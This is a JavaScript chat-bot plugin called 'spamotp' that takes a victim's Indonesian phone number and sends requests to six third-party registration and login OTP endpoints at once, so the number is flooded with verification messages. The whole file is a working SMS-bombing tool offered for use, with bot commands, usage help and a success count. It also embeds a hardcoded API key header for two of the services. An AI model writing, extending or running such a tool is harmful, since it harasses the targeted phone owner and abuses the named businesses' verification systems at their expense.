// Plugins-ESM/tools/spamotp.js
'use strict';
import axios from 'axios';

const LAYANAN = [
    {
        name: 'InternetRakyat',
        url: 'https://internetrakyat.id/api/app/auth/send-otp-register',
        method: 'POST',
        headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'x-api-key': '280999!FTTH'
        },
        body: (phone) => ({ phone_number: phone })
    },
    {
        name: 'BonusBelanja',
        url: 'https://www.bonusbelanja.com/api/auth/registration/app',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: (phone, name = 'User') => ({
            phone,
            name,
            agreeTnc: true,
            agreeContact: true
        })
    },
    {
        name: 'Fastwork (Login)',
        url: 'https://api.fastwork.id/auth/v2/login.authorize',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: (phone) => {
            const formatted = phone.startsWith('62') ? '0' + phone.slice(2) : phone;
            return { auth_user: formatted };
        }
    },
    {
        name: 'Fastwork (Validate)',
        url: 'https://api.fastwork.id/auth/v2/signup.validate',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: (phone) => {
            const formatted = phone.startsWith('62') ? '0' + phone.slice(2) : phone;
            return { phone_number: formatted };
        }
    },
    {
        name: 'Fastwork (OTP)',
        url: 'https://api.fastwork.id/auth/v2/signup.sendVerificationCode',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: (phone) => {
            const formatted = phone.startsWith('62') ? '0' + phone.slice(2) : phone;
            return { phone_number: formatted };
        }
    },
    {
        name: 'StarliteIndonesia',
        url: 'https://starliteindonesia.com/api/customer-registration/phone-otp/request',
        method: 'POST',
        headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'x-api-key': '280999!FTTH'
        },
        body: (phone) => ({ phone_number: phone })
    }
];

async function sendOTP(service, phone, name = 'User') {
    try {
        const body = typeof service.body === 'function' ? service.body(phone, name) : service.body;
        const res = await axios({
            method: service.method || 'POST',
            url: service.url,
            headers: service.headers || { 'Content-Type': 'application/json' },
            data: body,
            timeout: 15000
        });
        return { service: service.name, success: true, data: res.data };
    } catch (err) {
        return {
            service: service.name,
            success: false,
            error: err.response?.data || err.message || 'Unknown error'
        };
    }
}

const handler = async (m, { args }) => {
    let phone = args?.[0] || '';
    if (!phone) {
        return m.reply(
            `╭┈┈⬡「 *SPAM OTP* 」\n┃\n┃ ✧ Kirim OTP ke nomor dari berbagai layanan.\n┃\n┃ ✧ Cara pakai:\n┃ ✧ .spamotp <nomor>\n┃\n┃ ✧ Contoh:\n┃ ✧ .spamotp 6281234567890\n┃\n┃ ✧ *Catatan:*\n┃ ✧ Pastikan nomor sudah dalam format 62...\n╰┈┈┈┈┈┈┈┈⬡`
        );
    }
    // Bersihkan nomor: hanya angka
    phone = phone.replace(/\D/g, '');
    if (!phone.startsWith('62')) {
        return m.reply('❌ Nomor harus diawali 62 (contoh: 6281234567890)');
    }

    await m.reply(`⏳ Mengirim OTP ke ${phone}... (mohon tunggu)`);

    const promises = LAYANAN.map(service => sendOTP(service, phone));
    const results = await Promise.allSettled(promises);

    let successCount = 0;
    let failCount = 0;
    let output = `╭┈┈⬡「 *HASIL SPAM OTP* 」\n┃\n┃ 📱 Nomor: ${phone}\n┃\n`;

    for (const result of results) {
        if (result.status === 'fulfilled') {
            const data = result.value;
            if (data.success) {
                successCount++;
                output += `┃ ✅ *${data.service}*: Berhasil\n`;
                const msg = data.data?.message || data.data?.status || 'OK';
                output += `┃    ↳ ${msg}\n`;
            } else {
                failCount++;
                output += `┃ ❌ *${data.service}*: Gagal\n`;
                const errMsg = typeof data.error === 'string' ? data.error : JSON.stringify(data.error).slice(0, 80);
                output += `┃    ↳ ${errMsg}\n`;
            }
        } else {
            failCount++;
            output += `┃ ❌ *Unknown*: ${result.reason?.message || 'Error'}\n`;
        }
    }

    output += `┃\n┃ ✧ Sukses: ${successCount}  Gagal: ${failCount}\n╰┈┈┈┈┈┈┈┈⬡`;
    await m.reply(output);
};

handler.help = ['spamotp <nomor>'];
handler.tags = ['tools'];
handler.command = /^(spamotp|otp|spam)$/i;
handler.limit = true;

export default handler;